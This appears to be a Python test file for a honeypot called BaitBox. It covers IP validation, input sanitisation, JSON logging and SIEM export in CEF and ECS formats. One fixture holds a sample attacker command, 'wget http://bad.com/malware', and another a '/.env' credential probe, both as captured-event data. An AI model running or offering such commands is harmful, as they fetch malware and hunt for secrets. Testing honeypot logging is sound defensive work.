"""Unit and integration tests for telemetry, SIEM export (CEF, ECS), and structured logging."""

import asyncio
import json
import logging
import tempfile
import unittest
from pathlib import Path
from fastapi.testclient import TestClient

from baitbox import db, db_sqlite
from baitbox.servers.http_server import app, create_jwt_token
from baitbox.telemetry import (
    JSONLogFormatter,
    clamp_limit,
    export_cef_event,
    export_ecs_event,
    is_loopback_ip,
    is_private_ip,
    sanitize_input,
    validate_ip_address,
)


class TelemetryTests(unittest.TestCase):
    def test_validate_ip_address(self):
        """Test IPv4 and IPv6 validation and normalization."""
        self.assertEqual(validate_ip_address("192.168.1.1"), "192.168.1.1")
        self.assertEqual(validate_ip_address("  10.0.0.1  "), "10.0.0.1")
        self.assertEqual(validate_ip_address("::1"), "::1")
        self.assertEqual(validate_ip_address("2001:0db8:85a3:0000:0000:8a2e:0370:7334"), "2001:db8:85a3::8a2e:370:7334")

        with self.assertRaises(ValueError):
            validate_ip_address("invalid.ip.address")
        with self.assertRaises(ValueError):
            validate_ip_address("999.999.999.999")
        with self.assertRaises(ValueError):
            validate_ip_address("")

    def test_ip_classification_helpers(self):
        """Test is_private_ip and is_loopback_ip."""
        self.assertTrue(is_private_ip("192.168.1.1"))
        self.assertTrue(is_private_ip("10.0.0.5"))
        self.assertTrue(is_private_ip("172.16.0.1"))
        self.assertFalse(is_private_ip("8.8.8.8"))
        self.assertFalse(is_private_ip("invalid"))

        self.assertTrue(is_loopback_ip("127.0.0.1"))
        self.assertTrue(is_loopback_ip("::1"))
        self.assertFalse(is_loopback_ip("10.0.0.1"))

    def test_sanitize_input_and_clamp_limit(self):
        """Test input sanitization and limit clamping."""
        self.assertEqual(sanitize_input("  hello world  "), "hello world")
        long_str = "A" * 10000
        sanitized = sanitize_input(long_str, max_length=100)
        self.assertEqual(len(sanitized), 100)

        self.assertEqual(clamp_limit(50, minimum=1, maximum=100), 50)
        self.assertEqual(clamp_limit(500, minimum=1, maximum=100), 100)
        self.assertEqual(clamp_limit(-10, minimum=1, maximum=100), 1)
        self.assertEqual(clamp_limit("invalid", default=25), 25)

    def test_export_cef_event(self):
        """Test ArcSight CEF string generation."""
        event = {
            "id": 1,
            "timestamp": "2026-09-09T12:00:00Z",
            "src_ip": "203.0.113.5",
            "protocol": "SSH",
            "event_type": "command",
            "threat_score": 80,
            "threat_level": "CRITICAL",
            "payload": {"command": "wget http://bad.com/malware"},
            "mitre_techniques": ["T1059.004", "T1105"],
        }
        cef = export_cef_event(event)
        self.assertTrue(cef.startswith("CEF:0|BaitBox|Honeypot|2.2.0|command|SSH Command|8|"))
        self.assertIn("src=203.0.113.5", cef)
        self.assertIn("proto=SSH", cef)
        self.assertIn("cn1=80", cef)
        self.assertIn("msg=wget http://bad.com/malware", cef)
        self.assertIn("cs1=T1059.004,T1105", cef)

    def test_export_ecs_event(self):
        """Test Elastic Common Schema (ECS) dict generation."""
        event = {
            "id": 2,
            "timestamp": "2026-09-09T12:05:00Z",
            "src_ip": "198.51.100.2",
            "protocol": "HTTP",
            "event_type": "credential_probe",
            "threat_score": 75,
            "threat_level": "CRITICAL",
            "payload": {"path": "/.env", "method": "GET"},
            "geo": {"country": "United States", "countryCode": "US"},
            "mitre_techniques": ["T1552.001"],
        }
        ecs = export_ecs_event(event)
        self.assertEqual(ecs["ecs"]["version"], "8.11.0")
        self.assertEqual(ecs["event"]["kind"], "alert")
        self.assertEqual(ecs["source"]["ip"], "198.51.100.2")
        self.assertEqual(ecs["network"]["protocol"], "http")
        self.assertEqual(ecs["url"]["path"], "/.env")
        self.assertEqual(ecs["source"]["geo"]["country_name"], "United States")
        self.assertEqual(ecs["threat"]["technique"][0]["id"], "T1552.001")

    def test_json_log_formatter(self):
        """Test structured JSON logging formatter."""
        formatter = JSONLogFormatter()
        record = logging.LogRecord(
            name="test_logger",
            level=logging.INFO,
            pathname="test_path.py",
            lineno=42,
            msg="User login failed from %s",
            args=("192.0.2.1",),
            exc_info=None,
        )
        output = formatter.format(record)
        data = json.loads(output)
        self.assertEqual(data["level"], "INFO")
        self.assertEqual(data["logger"], "test_logger")
        self.assertEqual(data["message"], "User login failed from 192.0.2.1")
        self.assertIn("timestamp", data)


class SIEMExportAPITests(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        tmp_db = str(Path(self.tmpdir.name) / "events.db")
        db.DB_NAME = tmp_db
        db_sqlite.DB_NAME = tmp_db
        asyncio.run(db.init_db())
        asyncio.run(db.log_event("203.0.113.5", "HTTP", "credential_probe", {"path": "/.env", "method": "GET"}))
        self.client = TestClient(app)
        self.token = create_jwt_token("admin")
        self.headers = {"Authorization": f"Bearer {self.token}"}

    def tearDown(self):
        self.tmpdir.cleanup()

    def test_api_export_cef(self):
        """Test /api/events/export?format=cef returns text/plain CEF stream."""
        response = self.client.get("/api/events/export?format=cef", headers=self.headers)
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.headers["content-type"], "text/plain; charset=utf-8")
        self.assertIn("attachment; filename=baitbox-events.cef", response.headers.get("content-disposition", ""))
        self.assertIn("CEF:0|BaitBox|Honeypot", response.text)

    def test_api_export_ecs(self):
        """Test /api/events/export?format=ecs returns JSON with ECS events array."""
        response = self.client.get("/api/events/export?format=ecs", headers=self.headers)
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertIn("events", data)
        self.assertIn("count", data)
        self.assertTrue(data["count"] >= 1)

    def test_api_attack_summary(self):
        """Test /api/attack-summary returns attack vector stats."""
        response = self.client.get("/api/attack-summary", headers=self.headers)
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertIn("total_tracked_ips", data)
        self.assertIn("top_mitre_techniques", data)


if __name__ == "__main__":
    unittest.main()
